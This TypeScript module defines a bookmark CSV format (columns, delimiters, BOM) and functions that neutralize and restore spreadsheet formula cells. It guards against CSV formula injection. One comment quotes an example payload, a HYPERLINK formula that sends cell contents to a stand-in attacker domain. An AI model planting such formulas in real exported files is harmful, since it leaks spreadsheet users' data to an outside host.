/**
 * The CSV dialect — docs/04 §3. Shared by the reader, the writer and the
 * format sniffer, so the three can never disagree about what our CSV is.
 */

/** The header row, in order. A file is our CSV only if it says exactly this. */
export const CSV_COLUMNS = ['folder_path', 'title', 'url', 'add_date'] as const;

export type CsvDelimiter = ',' | ';';

/** `;` exists for locales whose Excel list separator is not a comma. */
export const CSV_DELIMITERS: readonly CsvDelimiter[] = [',', ';'];

/**
 * UTF-8 byte order mark — written so Excel detects the encoding on
 * double-click. Spelled as an escape: the raw character is invisible in every
 * editor, and one save that strips it would silently change what ships.
 */
export const CSV_BOM = '﻿';

/** A cell a spreadsheet would evaluate as a formula, after any guard quotes. */
const FORMULA_START = /^'*[=+\-@\t\r]/;

/**
 * Prefix one `'` to a cell a spreadsheet would run as a formula.
 *
 * A bookmark titled `=HYPERLINK("https://evil.example/?"&A2,"Sign in")` opened
 * from our CSV (which carries a BOM precisely so Excel opens it) was a live
 * formula; `@user`, `+1 …` and `-20% off` showed `#NAME?` and were destroyed by
 * the review-and-re-save workflow CSV exists for. A cell that already starts
 * with guard quotes before a trigger gets one more, so `restoreFormula` can
 * always undo exactly one and the round trip stays exact.
 */
export function neutralizeFormula(cell: string): string {
  return FORMULA_START.test(cell) ? `'${cell}` : cell;
}

/** Undo `neutralizeFormula`: drop one guard quote, only where one was added. */
export function restoreFormula(cell: string): string {
  return cell.startsWith("'") && FORMULA_START.test(cell.slice(1)) ? cell.slice(1) : cell;
}
